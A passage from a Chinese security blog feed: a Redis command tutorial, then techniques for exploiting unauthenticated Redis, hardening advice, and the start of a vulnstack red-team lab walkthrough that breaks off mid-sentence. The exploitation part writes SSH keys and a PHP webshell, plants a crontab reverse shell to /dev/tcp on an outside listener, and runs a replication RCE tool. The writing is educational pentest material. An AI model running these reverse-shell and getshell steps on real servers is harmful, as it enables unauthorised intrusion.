<code>nil</code> 表示。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET redis redis.com</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; SET mongodb mongodb.org</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET redis mongodb</span><br><span class="line">1) &quot;redis.com&quot;</span><br><span class="line">2) &quot;mongodb.org&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; MGET redis mongodb mysql     # 不存在的 mysql 返回 nil</span><br><span class="line">1) &quot;redis.com&quot;</span><br><span class="line">2) &quot;mongodb.org&quot;</span><br><span class="line">3) (nil)</span><br></pre></td></tr></table></figure><p><strong>DEL key</strong></p><p>删除key对应的键值数据。</p><h3 id="2-3-4-hash类型命令"><a href="#2-3-4-hash类型命令" class="headerlink" title="2.3.4 hash类型命令"></a>2.3.4 hash类型命令</h3><p>类似一个对象或者结构体。</p><p><strong>应用场景：</strong></p><p>我们要存储一个用户信息对象数据，其中包括用户ID、用户姓名、年龄和生日，通过用户ID我们希望获取该用户的姓名或者年龄或者生日；</p><p><strong>实现方式：</strong></p><p>Redis的Hash实际是内部存储的Value为一个HashMap，并提供了直接存取这个Map成员的接口。如图所示，Key是用户ID, value是一个Map。这个Map的key是成员的属性名，value是属性值。这样对数据的修改和存取都可以直接通过其内部Map的Key(Redis里称内部Map的key为field), 也就是通过 key(用户ID) + field(属性标签) 就可以操作对应属性数据。</p><p><strong>如图所示：</strong></p><p><img src="http://image.v0w.top/Blog/2020-08-09-123507.jpg"></p><p><strong>常用命令</strong></p><ul><li>hget hash field</li><li>hset hash field value</li><li>hgetall hash</li><li>hmset key field value [f v…]</li><li>HKEYS key</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; HSET 1 name &quot;V0WKeep3r&quot; brith 1998 age 22</span><br><span class="line">(integer) 3</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; Hget 1 name</span><br><span class="line">&quot;V0WKeep3r&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; hgetall 1</span><br><span class="line">1) &quot;name&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;brith&quot;</span><br><span class="line">4) &quot;1998&quot;</span><br><span class="line">5) &quot;age&quot;</span><br><span class="line">6) &quot;22&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; hkeys 1</span><br><span class="line">1) &quot;name&quot;</span><br><span class="line">2) &quot;brith&quot;</span><br><span class="line">3) &quot;age&quot;</span><br></pre></td></tr></table></figure><h3 id="2-3-5-List类型命令"><a href="#2-3-5-List类型命令" class="headerlink" title="2.3.5 List类型命令"></a>2.3.5 List类型命令</h3><p><strong>LPUSH key value [value …] 插入元素创建列表</strong></p><p>将一个或多个值 <code>value</code> 插入到列表 <code>key</code> 的表头</p><p>如果有多个 <code>value</code> 值，那么各个 <code>value</code> 值按从左到右的顺序依次插入到表头： 比如说，对空列表 <code>mylist</code> 执行命令 <code>LPUSH mylist a b c</code> ，列表的值将是 <code>c b a</code> ，这等同于原子性地执行 <code>LPUSH mylist a</code> 、 <code>LPUSH mylist b</code> 和 <code>LPUSH mylist c</code> 三个命令。</p><p>如果 <code>key</code> 不存在，一个空列表会被创建并执行 LPUSH 操作。</p><p>当 <code>key</code> 存在但不是列表类型时，返回一个错误。</p><p><strong>RPUSH key value [value …] 向表尾插入元素</strong></p><p>不存在也会新建空列表。</p><p><strong>LPOP key 移除并返回列表头元素</strong></p><p><strong>RPOP key移除并返回列表尾元素</strong></p><p><strong>LSET key index value 设置列表元素</strong></p><p>将列表 <code>key</code> 下标为 <code>index</code> 的元素的值设置为 <code>value</code> 。当 <code>index</code> 参数超出范围，或对一个空列表( <code>key</code> 不存在)进行 LSET 时，返回一个错误。</p><p><strong>LLEN key 获取列表长度</strong></p><p><strong>LINDEX key index 通过索引获取列表元素</strong></p><p><strong>LRANGE key start stop 返回区间中的元素</strong></p><p>返回列表 <code>key</code> 中指定区间内的元素，区间以偏移量 <code>start</code> 和 <code>stop</code> 指定。</p><p>下标(index)参数 <code>start</code> 和 <code>stop</code> 都以 <code>0</code> 为底，也就是说，以 <code>0</code> 表示列表的第一个元素，以 <code>1</code> 表示列表的第二个元素，以此类推。</p><p>你也可以使用负数下标，以 <code>-1</code> 表示列表的最后一个元素， <code>-2</code> 表示列表的倒数第二个元素，以此类推。</p><p><strong>LINSERT key BEFORE|AFTER pivot value 插入元素</strong></p><p>将值 <code>value</code> 插入到列表 <code>key</code> 当中，位于值 <code>pivot</code> 之前或之后。</p><p>当 <code>pivot</code> 不存在于列表 <code>key</code> 时，不执行任何操作。</p><p>当 <code>key</code> 不存在时， <code>key</code> 被视为空列表，不执行任何操作。</p><p>如果 <code>key</code> 不是列表类型，返回一个错误。</p><p><strong>举例</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; llen list</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379[4]&gt; Lpush list <span class="string">&quot;V0W&quot;</span> <span class="string">&quot;V0WKeep3r&quot;</span> <span class="string">&quot;noob&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Rpush list <span class="string">&quot;Rookie&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379[4]&gt; Lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;noob&quot;</span></span><br><span class="line">2) <span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">3) <span class="string">&quot;V0W&quot;</span></span><br><span class="line">4) <span class="string">&quot;Rookie&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; LPOP list</span><br><span class="line"><span class="string">&quot;noob&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; RPOP list</span><br><span class="line"><span class="string">&quot;Rookie&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; Lset list 1 Great</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[4]&gt; LLen list</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379[4]&gt; Lindex list 0</span><br><span class="line"><span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">127.0.0.1:6379[4]&gt; Linsert list after <span class="string">&quot;Great&quot;</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;V0WKeep3r&quot;</span></span><br><span class="line">2) <span class="string">&quot;Great&quot;</span></span><br><span class="line">3) <span class="string">&quot;Hacker&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-6-Set类型命令"><a href="#2-3-6-Set类型命令" class="headerlink" title="2.3.6 Set类型命令"></a>2.3.6 Set类型命令</h3><p><strong>SADD key member [member …] 添加元素到集合</strong></p><p>将一个或多个 <code>member</code> 元素加入到集合 <code>key</code> 当中，已经存在于集合的 <code>member</code> 元素将被忽略。</p><p>假如 <code>key</code> 不存在，则创建一个只包含 <code>member</code> 元素作成员的集合。</p><p>当 <code>key</code> 不是集合类型时，返回一个错误。</p><p><strong>SPOP key 移除并返回集合中的一个随机元素</strong></p><p>**SREM key member [member …] **</p><p>移除集合 <code>key</code> 中的一个或多个 <code>member</code> 元素，不存在的 <code>member</code> 元素会被忽略。当 <code>key</code> 不是集合类型，返回一个错误。</p><p><strong>SMEMBERS key 返回集合中的所有成员</strong></p><p><strong>SINTER key [key …] 交集</strong></p><p>返回一个集合的全部成员，该集合是所有给定集合的交集。不存在的 <code>key</code> 被视为空集。当给定集合当中有一个空集时，结果也为空集(根据集合运算定律)。</p><p><strong>SUNION key [key …] 并集</strong></p><p><strong>SDIFF key [key …] 差集</strong></p><p><strong>举例</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; SADD students &quot;olivia&quot; &quot;V0WKeep3r&quot;</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379[4]&gt; SADD hackers &quot;V0WKeep3r&quot; &quot;p0&quot; &quot;kingkk&quot; &quot;phithon&quot;</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379[4]&gt; Spop hackers 2</span><br><span class="line">1) &quot;kingkk&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SMembers hackers</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;p0&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; Srem hackers &quot;p0&quot;</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379[4]&gt; SADD hackers &quot;p0&quot; &quot;kingkk&quot; &quot;V0WKeep3r&quot;</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379[4]&gt; Smembers hackers</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;p0&quot;</span><br><span class="line">4) &quot;kingkk&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SUNION hackers students</span><br><span class="line">1) &quot;p0&quot;</span><br><span class="line">2) &quot;V0WKeep3r&quot;</span><br><span class="line">3) &quot;kingkk&quot;</span><br><span class="line">4) &quot;olivia&quot;</span><br><span class="line">5) &quot;phithon&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SINTER hackers students</span><br><span class="line">1) &quot;V0WKeep3r&quot;</span><br><span class="line">127.0.0.1:6379[4]&gt; SDIFF hackers students</span><br><span class="line">1) &quot;phithon&quot;</span><br><span class="line">2) &quot;p0&quot;</span><br><span class="line">3) &quot;kingkk&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x03-Redis-在渗透测试中的利用"><a href="#0x03-Redis-在渗透测试中的利用" class="headerlink" title="0x03 Redis 在渗透测试中的利用"></a>0x03 Redis 在渗透测试中的利用</h1><h2 id="3-1-Redis未授权访问"><a href="#3-1-Redis未授权访问" class="headerlink" title="3.1 Redis未授权访问"></a>3.1 Redis未授权访问</h2><p><strong>redis-4.0.10 之前的版本</strong>   Redis服务默认时没有密码验证的，而且默认将redis绑定到0.0.0.0:6379，部分DBA在配置时不注意，同时也没有采用添加防火墙等安全策略，将会导致Redis服务直接暴露到公网。</p><p>其他用户和攻击者可以在未授权的情况下，可以直接对redis进行访问，并进行操作。</p><p><img src="http://image.v0w.top/Blog/2020-08-11-redis.png"></p><p><strong>redis-4.0.10 之后的版本</strong> 默认开启了保护模式，仅允许本地无密码验证连接。如果再想利用，可能就要考虑弱口令和配置错误了。</p><p><img src="http://image.v0w.top/Blog/2020-08-11-040217.png"></p><p>Redis未授权漏洞常见的漏洞利用方式：</p><ul><li>Windows下，绝对路径写webshell 、写入启动项。</li><li>Linux下，绝对路径写webshell 、公私钥认证获取root权限 、利用contrab计划任务反弹shell。</li></ul><h2 id="3-2-信息泄漏"><a href="#3-2-信息泄漏" class="headerlink" title="3.2 信息泄漏"></a>3.2 信息泄漏</h2><p>通过上述Redis命令来获取信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO# 查看信息</span><br><span class="line"># Server</span><br><span class="line">redis_version:6.0.6</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">KEYS *# 看所有键</span><br><span class="line">1) &quot;key&quot;</span><br><span class="line">2) &quot;key-with-expire-time&quot;</span><br><span class="line"></span><br><span class="line">flushall# 删除所有数据库内容</span><br><span class="line"></span><br><span class="line">flushdb# 刷新数据库</span><br><span class="line"></span><br><span class="line">config set dir dirpath 设置路径等配置</span><br><span class="line"></span><br><span class="line">config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;src&quot;</span><br></pre></td></tr></table></figure><h2 id="3-3-Redis-getshell"><a href="#3-3-Redis-getshell" class="headerlink" title="3.3 Redis getshell"></a>3.3 Redis getshell</h2><h3 id="3-3-1-利用Redis写公钥-进行ssh连接"><a href="#3-3-1-利用Redis写公钥-进行ssh连接" class="headerlink" title="3.3.1 利用Redis写公钥 进行ssh连接"></a>3.3.1 利用Redis写公钥 进行ssh连接</h3><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">#生成ssh公钥和私钥</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat redis_key.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line"># 这里的换行符是防止密钥数据和其他的 redis 缓存数据混合</span><br><span class="line"></span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;key.txt | .&#x2F;redis-cli -h xxx.xxx.xxx.xxx -p 6379 -x set key </span><br><span class="line"># 将公钥写入redis，也可以通过连接redis再写，这里直接用管道写入了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"># 改变 redis 的 RDB 目录以及文件为 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"># 存盘，就会将ssh公钥保存到&#x2F;root&#x2F;.ssh&#x2F;auuthorized_keys</span><br></pre></td></tr></table></figure><p> 将ssh公钥写入redis的键值</p><p><img src="http://image.v0w.top/Blog/2020-08-13-043354.png"></p><p>发现服务器已经被写入ssh公钥</p><p><img src="http://image.v0w.top/Blog/2020-08-13-042409.png" alt="服务器被写入ssh公钥"></p><p>通过ssh私钥连接到服务器，getshell。</p><p><img src="http://image.v0w.top/Blog/2020-08-13-035016.png" alt="通过ssh私钥连接到服务器"></p><h3 id="3-3-2-利用Redis-写-crontab任务反弹shell"><a href="#3-3-2-利用Redis-写-crontab任务反弹shell" class="headerlink" title="3.3.2 利用Redis 写 crontab任务反弹shell"></a>3.3.2 利用Redis 写 crontab任务反弹shell</h3><p>通过redis写键值，值由上一方法的ssh公钥变成crontable定时任务。定时任务的内容就是一个反弹shell的命令。然后保存到<code>/var/spool/cron/root</code></p><blockquote><p>/var/spool/cron/ 这个目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，比如tom建的crontab任务对应的文件就是/var/spool/cron/tom。一般一个用户最多只有一个crontab文件。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set poc2 &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;23333 0&gt;&amp;1\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>理论上，我们的数据应该像写ssh时一样，较为完好的保存，并每过一分钟执行。</p><p>事实上，我在测试此方法时，并没有成功，在任务写入/cron/root的过程中，似乎出现了错误，或者乱码。最终我的poc2，在/cron/root中的内容保存成这个样子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@centos-7 cron]# crontab -l</span><br><span class="line">REDIS0007�redis-ver3.2.12�</span><br><span class="line">redis-bits�@�ctime�V�4_used-mem�f</span><br><span class="line">                                 ��poc2�8&#x3D;</span><br><span class="line"></span><br><span class="line">*&#x2F;1 *�bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;182.9&#96;102&#x2F;23  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">���e;�8L</span><br></pre></td></tr></table></figure><p>监听地址：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis服务：CentOS7 redis3.2.12  虚拟机</span><br><span class="line">攻击机： MACOS 10.15 </span><br><span class="line">VPS： 阿里云 ECS CentOS7</span><br></pre></td></tr></table></figure><p>暂时不知道是什么原因导致的==、</p><p>这一点很奇怪，困扰我很久==、</p><p>于是尝试使用另一个地址，使用攻击机监听，结果成了==、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc4&gt;</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;10.211.55.2&#x2F;23333 0&gt;&amp;1 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-13-070355.png"></p><h3 id="3-3-3-利用Redis-写webshell"><a href="#3-3-3-利用Redis-写webshell" class="headerlink" title="3.3.3 利用Redis 写webshell"></a>3.3.3 利用Redis 写webshell</h3><p>和前两个思路一样。</p><p>通过redis写键值，值变成一句话木马等。然后保存到<code>/var/www/html</code>或是其他web目录。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">OK</span><br><span class="line">&gt; config set dbfilename redis_shell.php</span><br><span class="line">OK</span><br><span class="line">&gt; keys *</span><br><span class="line">1) &quot;hacker&quot;</span><br><span class="line">&gt; del hacker</span><br><span class="line">(integer) 1</span><br><span class="line">&gt; set shell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure><p>之后webshell文件就写入了web目录，就可以getshell了。</p><p><img src="http://image.v0w.top/Blog/2020-08-13-073527.png"></p><h3 id="3-3-4-利用Redis主从复制getshell"><a href="#3-3-4-利用Redis主从复制getshell" class="headerlink" title="3.3.4 利用Redis主从复制getshell"></a>3.3.4 利用Redis主从复制getshell</h3><p>基于Redis主从复制的机制，可以通过FULLRESYNC将任意文件同步到从节点（slave），这就使得它可以轻易实现以上任何一种漏洞利用方式，而且存在着更多的可能性，等待被探索。</p><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用条件: Redis 4.x/5.x</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line"><span class="built_in">cd</span> RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Ridter/redis-rce.git</span><br><span class="line"><span class="built_in">cd</span> redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-19-085343.png"></p><p><strong>Bypass师傅0rz 分析过该漏洞的原理：<a href="https://www.cnblogs.com/xiaozi/p/13089906.html">Redis主从复制getshell技巧</a></strong></p><h1 id="0x04-Redis安全防御"><a href="#0x04-Redis安全防御" class="headerlink" title="0x04 Redis安全防御"></a>0x04 Redis安全防御</h1><ol><li><p><strong>禁用高危命令</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在 redis.conf 文件中直接将危险命令置空，或者改变其名字</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">rename-command FLUSHALL &quot;name1&quot;</span><br><span class="line">rename-command CONFIG &quot;name2&quot;</span><br><span class="line">rename-command EVAL &quot;name3&quot;</span><br></pre></td></tr></table></figure></li><li><p><strong>以低权限运行 Redis 服务</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis默认使用用户权限启动的，降权可以避免getshell后直接root</span><br><span class="line">groupadd -r redis   </span><br><span class="line">useradd -r -g redis redis</span><br></pre></td></tr></table></figure></li><li><p><strong>为 Redis 添加密码验证</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改 redis.conf 文件，添加</span><br><span class="line"></span><br><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure></li><li><p><strong>做好访问控制，在不需要接外网时，就bind本地。</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改 redis.conf 文件：</span><br><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p><strong>修改默认端口</strong></p></li><li><p><strong>设置隐藏文件属性，不允许修改authorized_keys</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 400 ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chattr +i ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chattr +i ~&#x2F;.ssh</span><br></pre></td></tr></table></figure></li><li><p><strong>设置防火墙策略，只允许特定IP连接</strong></p></li></ol><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul><li><p><a href="https://www.cnblogs.com/powertoolsteam/p/redis.html">Redis是什么？看这一篇就够了</a></p></li><li><p><a href="https://www.redis.net.cn/order/">https://www.redis.net.cn/order/</a></p></li><li><p><a href="http://redisdoc.com/">http://redisdoc.com/</a></p></li><li><p><a href="http://redisguide.com/">http://redisguide.com/</a></p></li><li><p><a href="https://www.k0rz3n.com/2018/11/08/Redis%20%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8">k0rz3n-Redis 基础梳理以及其在渗透测试中的利用</a></p></li><li><p><a href="https://p0sec.net/index.php/archives/69/">p0-redis未授权访问漏洞利用总结</a></p></li><li><p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">Bypass-Redis主从复制getshell技巧</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文主要介绍redis技术是什么，有什么优势，有什么缺点。接着会从安全渗透的角度，剖析其存在的安全隐</summary>
      
    
    
    
    <category term="Web安全" scheme="http://v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="webshell" scheme="http://v0w.top/tags/webshell/"/>
    
    <category term="mysql" scheme="http://v0w.top/tags/mysql/"/>
    
    <category term="Redis" scheme="http://v0w.top/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>红日安全vulnstack-ATT&amp;CK实战系列 红队实战（一）</title>
    <link href="http://v0w.top/2020/07/19/vulnstack1/"/>
    <id>http://v0w.top/2020/07/19/vulnstack1/</id>
    <published>2020-07-18T16:00:00.000Z</published>
    <updated>2020-09-25T09:04:34.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今后，尽量每周抽时间对较为完整的一个渗透靶机进行练习，先从红日安全团队分享的靶机实战环境开始吧。感谢<strong>红日安全团队</strong>分享的靶机实战环境。红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。</p><p>靶机下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></p><p>本文的目的是为了记录和巩固知识点，并分享出来。</p><p>今天先从第一个开始。<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">ATT&amp;CK实战系列——红队实战（一）</a></p><p>闲话扯完了，冲！</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>红日安全团队提供的靶机都是虚拟机形式，需要对虚拟机网络进行一定的配置。关于VMware的几种网络模式的原理和区别，可以参考这篇文章——<a href="https://www.cnblogs.com/xuliangxing/p/7027124.html">VMware网络连接模式——桥接模式、NAT模式以及仅主机模式的介绍和区别</a> 介绍非常详细，通俗易懂。</p><p>我们下载完靶机有三个压缩包，对应三个虚拟机：</p><p><img src="http://image.v0w.top/Blog/20200719122321.png"></p><p>VM1为win7，VM2为winserver 2003即win2k3，VM3为winserver 2008，拓扑图为下图所示：</p><p><img src="http://image.v0w.top/Blog/20200719123222.png"></p><p>可以看到VM1是通外网的Web服务器，VM2和VM3是内网环境，与外网隔绝，只可以通过VM1进行访问。</p><p>一要营造一个内网环境（包括VM1，VM2，VM3），因此需要将虚拟机与外网隔绝，在VMware中可以通过虚拟机设置中的网络适配器来设置，设置成仅主机模式放到一个VMnet中即可实现三台主机在一个内网。</p><p>二要使得VM1能够访问外网，所以需要给VM1添加一个网卡，设置成NAT模式。</p><p>所以最终我给VM1(win7) 设置两个网卡，一个自定义连接到VMnet1(仅主机模式)，另一个连接模式为NAT，方便连接外网。VM2(winserver2k3)和VM3(winserver2008)</p><p><img src="http://image.v0w.top/Blog/image-202007191322.png"></p><p>最终呈现的结果如下（画了一个不专业的拓扑，大概能表达我的意思吧）：</p><p><img src="http://image.v0w.top/Blog/20200719133039.png"></p><p><img src="http://image.v0w.top/Blog/20200719134920.png"></p><h1 id="0x02-启动靶机和服务"><a href="#0x02-启动靶机和服务" class="headerlink" title="0x02 启动靶机和服务"></a>0x02 启动靶机和服务</h1><p>将三个靶机都启动，此时需要占用较大的内存，建议将其他应用关闭，另外电脑配置最好能在16G及以上。</p><p>密码都是 <code>hongrisec@2019</code>，可能会提醒你修改密码，修改后务必记住自己的密码。</p><p>进入win7 启动phpstudy。</p><p><img src="http://image.v0w.top/Blog/20200719135927.png"></p><p>发现三台主机都是固定IP的，是在<code>192.168.52.0/24段</code>可以通过三台主机之前进行ping测试，测试能通后，可以正式开始练习了。如果遇到NAT（比如主机和同网段的kali）ping不通win7的情况，试着关闭防火墙再试试。</p><img src="http://image.v0w.top/Blog/20200719140851.png" style="zoom: 80%;" /><h1 id="0x03-拿下Web服务器"><a href="#0x03-拿下Web服务器" class="headerlink" title="0x03 拿下Web服务器"></a>0x03 拿下Web服务器</h1><p>上述基本完成后，我们可以正式开始本次靶机渗透之旅，Now It’s pentest time.</p><h2 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1 信息收集"></a>3.1 信息收集</h2><p>本机kali的地址为：<code>192.168.237.137</code></p><p>搜索同段的主机，再针对性的使用nmap进行服务端口扫描：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.237.0&#x2F;24</span><br></pre></td></tr></table></figure><p>或者直接使用nmap扫描同一C段：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.237.0&#x2F;24# -sP ping方式探测存活主机</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719152431.png" style="zoom:80%;" /><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -Pn -p 1-65535 192.168.237.136# -sC默认脚本 -sV 服务版本 -p指定端口</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719153434.png" style="zoom:80%;" /><h2 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h2><p>发现80 端口开放，进行访问，是一个php探针页面，结合信息收集阶段得到phpstudy的信息，可以确定是一个phpstudy的集成环境。</p><p>网站的绝对路径：<code>C:/phpStudy/www/</code></p><p>此时，有两种攻击方案：</p><ol><li><a href="https://paper.seebug.org/1044/">phpstudy 后门</a></li><li>看看MySQL能不能连进去</li></ol><p>测试发现使用的版本恰好没有后门文件可以利用。尝试第二种方式，测试MySQL外连和登录密码。这里出题比较简单，直接是弱口令，<code>root/root</code>就可以连进去，而且是可以外连的。</p><p>使用dirmap或者御剑扫描web目录，发现<code>phpmyAdmin</code>和<code>beifen.rar</code>（如果是没有弱口令，从备份文件中找配置也是一个突破口）</p><img src="http://image.v0w.top/Blog/20200719160240.png" style="zoom:80%;" /><p>备份文件是一个yxcms的源码：</p><img src="http://image.v0w.top/Blog/20200719162406.png" style="zoom:80%;" /><p>在全文搜索admin之后，发现后台默认的用户名和密码：<code>admin/123456</code></p><p>发现后台地址：<code>/index.php?r=admin</code></p><img src="http://image.v0w.top/Blog/20200719163239.png" style="zoom:50%;" /><p>接下来，又有两种攻击方案可以选择：</p><ol><li><strong><a href="https://zhuanlan.zhihu.com/p/114184542">利用phpMyAdmin漏洞进行getshell或者利用MySQL写Shell</a></strong></li><li><strong>继续跟进yxcms</strong></li></ol><p>因为是练习嘛，我们都尝试一遍。</p><h3 id="3-2-1-mysql日志写shell"><a href="#3-2-1-mysql日志写shell" class="headerlink" title="3.2.1 mysql日志写shell"></a>3.2.1 mysql日志写shell</h3><p>先看一下有没有写权限：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719164102.png" style="zoom:50%;" /><p><code>secure_file_priv 